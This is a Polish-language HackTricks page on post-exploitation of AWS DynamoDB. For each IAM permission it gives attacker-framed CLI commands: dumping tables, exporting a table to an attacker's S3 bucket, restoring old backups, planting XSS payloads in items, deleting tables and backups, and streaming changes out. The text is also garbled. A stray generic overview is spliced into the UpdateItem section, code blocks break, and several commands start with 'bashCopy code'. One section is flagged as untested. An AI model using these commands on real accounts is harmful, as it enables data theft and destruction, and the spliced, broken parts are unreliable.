# AWS - Eksploatacja po ataku na DynamoDB

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## DynamoDB

Aby uzyskać więcej informacji, sprawdź:

{% content-ref url="../aws-services/aws-databases/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-databases/aws-dynamodb-enum.md)
{% endcontent-ref %}

### `dynamodb:BatchGetItem`

Atakujący posiadający te uprawnienia będzie w stanie **pobrać elementy z tabel na podstawie klucza głównego** (nie można po prostu poprosić o wszystkie dane z tabeli). Oznacza to, że musisz znać klucze główne (możesz je uzyskać, pobierając metadane tabeli (`describe-table`).

{% tabs %}
{% tab title="plik json" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{% endcode %}
{% endtab %}
{% endtabs %}



**Potencjalne skutki:** Pośrednie podniesienie uprawnień poprzez zlokalizowanie poufnych informacji w tabeli

### `dynamodb:GetItem`

**Podobnie jak poprzednie uprawnienia**, to pozwala potencjalnemu atakującemu na odczytanie wartości z jednej tabeli, podając klucz główny wpisu do pobrania:

{% code overflow="wrap" %}
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
{% endcode %}

Z tym uprawnieniem możliwe jest również użycie metody **`transact-get-items`** w ten sposób:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Potencjalne skutki:** Pośrednie podniesienie uprawnień poprzez zlokalizowanie wrażliwych informacji w tabeli

### `dynamodb:Query`

**Podobnie jak poprzednie uprawnienia**, to pozwala potencjalnemu atakującemu odczytywać wartości z jednej tabeli, podając klucz główny wpisu do pobrania. Pozwala używać [podzbioru porównań](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html), ale jedynym dozwolonym porównaniem z kluczem głównym (który musi się pojawić) jest "EQ", więc nie można użyć porównania, aby otrzymać całą bazę danych w jednym żądaniu.

{% tabs %}
{% tab title="plik json" %}
{% code overflow="wrap" %}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potencjalne skutki:** Pośrednie podniesienie uprawnień poprzez zlokalizowanie wrażliwych informacji w tabeli

### `dynamodb:Scan`

Możesz użyć tej uprawnienia do **łatwego wydobywania całej tabeli**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Potencjalne skutki:** Pośrednie podniesienie uprawnień poprzez zlokalizowanie wrażliwych informacji w tabeli

### `dynamodb:PartiQLSelect`

Możesz użyć tego uprawnienia do **łatwego wydrukowania całej tabeli**.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
To uprawnienie umożliwia również wykonanie `batch-execute-statement`, na przykład:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
ale musisz określić klucz główny z wartością, więc nie jest to takie przydatne.

**Potencjalne skutki:** Pośrednie podniesienie uprawnień poprzez zlokalizowanie wrażliwych informacji w tabeli

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

To uprawnienie umożliwi atakującemu **eksport całej tabeli do wybranego przez niego wiadra S3**:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Należy zauważyć, że aby to działało, tabela musi mieć włączoną funkcję przywracania punktu w czasie. Możesz sprawdzić, czy tabela ją posiada, używając:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
Jeśli nie jest włączone, będziesz musiał je **włączyć**, a do tego potrzebujesz uprawnienia **`dynamodb:ExportTableToPointInTime`**:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potencjalne zagrożenie:** Pośrednie podniesienie uprawnień poprzez zlokalizowanie wrażliwych informacji w tabeli

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

Z tymi uprawnieniami, atakujący będzie mógł **utworzyć nową tabelę z kopii zapasowej** (lub nawet utworzyć kopię zapasową, aby następnie przywrócić ją w innej tabeli). Następnie, posiadając odpowiednie uprawnienia, będzie mógł sprawdzić **informacje** z kopii zapasowych, które **nie muszą już znajdować się w tabeli produkcyjnej**.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Potencjalne skutki:** Pośrednie podniesienie uprawnień poprzez zlokalizowanie wrażliwych informacji w kopii zapasowej tabeli

### `dynamodb:PutItem`

To uprawnienie umożliwia użytkownikom dodawanie **nowego elementu do tabeli lub zastępowanie istniejącego elementu** nowym elementem. Jeśli element o tym samym kluczu głównym już istnieje, **cały element zostanie zastąpiony** nowym elementem. Jeśli klucz główny nie istnieje, zostanie **utworzony** nowy element o określonym kluczu głównym.

{% tabs %}
{% tab title="Przykład XSS" %}
{% code overflow="wrap" %}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="Przykład AI" %}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potencjalne skutki:** Wykorzystanie dalszych podatności/omijanie zabezpieczeń poprzez możliwość dodawania/modyfikowania danych w tabeli DynamoDB

### `dynamodb:UpdateItem`

To uprawnienie umożliwia użytkownikom **modyfikowanie istniejących atrybutów elementu lub dodawanie nowych atrybutów do elementu**. Nie **zastępuje** całego elementu; aktualizuje tylko określone atrybuty. Jeśli klucz główny nie istnieje w tabeli, operacja ta **utworzy nowy element** o określonym kluczu głównym i ustawia atrybuty określone w wyrażeniu aktualizacji.
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="Polish" %}

# AWS DynamoDB - Post-Exploitation

## Wprowadzenie

Po uzyskaniu dostępu do konta AWS i odkryciu, że DynamoDB jest używane, możemy przeprowadzić różne operacje post-exploitation.

## Przegląd tabel

Aby zobaczyć dostępne tabele w DynamoDB, możemy użyć polecenia `list-tables` w AWS CLI lub wywołać odpowiednie API.

```bash
aws dynamodb list-tables --region <region> --profile <profile>
```

## Pobieranie danych

Aby pobrać dane z tabeli DynamoDB, możemy użyć polecenia `scan` lub `query` w AWS CLI lub wywołać odpowiednie API.

```bash
aws dynamodb scan --table-name <table_name> --region <region> --profile <profile>
aws dynamodb query --table-name <table_name> --region <region> --profile <profile> --key-condition-expression <expression>
```

## Modyfikowanie danych

Aby modyfikować dane w tabeli DynamoDB, możemy użyć polecenia `put-item` w AWS CLI lub wywołać odpowiednie API.

```bash
aws dynamodb put-item --table-name <table_name> --region <region> --profile <profile> --item <item_json>
```

## Usuwanie danych

Aby usunąć dane z tabeli DynamoDB, możemy użyć polecenia `delete-item` w AWS CLI lub wywołać odpowiednie API.

```bash
aws dynamodb delete-item --table-name <table_name> --region <region> --profile <profile> --key <key_json>
```

## Tworzenie tabeli

Aby utworzyć nową tabelę w DynamoDB, możemy użyć polecenia `create-table` w AWS CLI lub wywołać odpowiednie API.

```bash
aws dynamodb create-table --table-name <table_name> --region <region> --profile <profile> --attribute-definitions <attribute_definitions_json> --key-schema <key_schema_json> --provisioned-throughput <provisioned_throughput_json>
```

## Usuwanie tabeli

Aby usunąć tabelę z DynamoDB, możemy użyć polecenia `delete-table` w AWS CLI lub wywołać odpowiednie API.

```bash
aws dynamodb delete-table --table-name <table_name> --region <region> --profile <profile>
```

## Podsumowanie

Po uzyskaniu dostępu do konta AWS i odkryciu, że DynamoDB jest używane, możemy przeprowadzać różne operacje post-exploitation, takie jak przeglądanie tabel, pobieranie, modyfikowanie i usuwanie danych, a także tworzenie i usuwanie tabel.
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potencjalne skutki:** Wykorzystanie dalszych podatności/obejść poprzez możliwość dodawania/modyfikowania danych w tabeli DynamoDB

### `dynamodb:DeleteTable`

Atakujący posiadający to uprawnienie może **usunąć tabelę DynamoDB, powodując utratę danych**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Potencjalne skutki**: Utrata danych i zakłócenie usług zależnych od usuniętej tabeli.

### `dynamodb:DeleteBackup`

Atakujący posiadający to uprawnienie może **usunąć kopię zapasową DynamoDB, co potencjalnie może spowodować utratę danych w przypadku scenariusza odzyskiwania po awarii**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Potencjalne skutki**: Utrata danych i niemożność odzyskania ich z kopii zapasowej w przypadku awarii i konieczności przywrócenia systemu.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

{% hint style="info" %}
TODO: Sprawdź, czy to naprawdę działa
{% endhint %}

Atakujący posiadający te uprawnienia może **włączyć strumień na tabeli DynamoDB, zaktualizować tabelę, aby rozpocząć strumieniowanie zmian, a następnie uzyskać dostęp do strumienia, aby monitorować zmiany w tabeli w czasie rzeczywistym**. Pozwala to atakującemu na monitorowanie i wyciek danych, co potencjalnie prowadzi do utraty poufności danych.

1. Włącz strumień na tabeli DynamoDB:
```bash
bashCopy codeaws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. Opis strumienia do uzyskania ARN i innych szczegółów:

Aby uzyskać ARN i inne szczegóły strumienia, wykonaj następujące kroki:

1. Otwórz konsolę AWS i przejdź do usługi DynamoDB.
2. Wybierz odpowiednią tabelę, która jest powiązana ze strumieniem.
3. W panelu nawigacyjnym po lewej stronie wybierz opcję "Strumienie".
4. Wybierz strumień, z którego chcesz uzyskać ARN i inne szczegóły.
5. W sekcji "Szczegóły strumienia" znajdziesz ARN, który jest unikalnym identyfikatorem strumienia.
6. Możesz również znaleźć inne szczegóły, takie jak typ strumienia, stan, rozmiar strumienia itp.

Pamiętaj, że ARN jest ważnym elementem, który jest używany do identyfikacji i zarządzania strumieniami w usłudze DynamoDB.
```bash
bashCopy codeaws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. Uzyskaj iterator fragmentu za pomocą ARN strumienia:
```bash
bashCopy codeaws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. Użyj iteratora shard, aby uzyskać dostęp i wydostać dane ze strumienia:
```bash
bashCopy codeaws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potencjalne skutki**: Monitorowanie w czasie rzeczywistym i wyciek danych z tabeli DynamoDB.

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
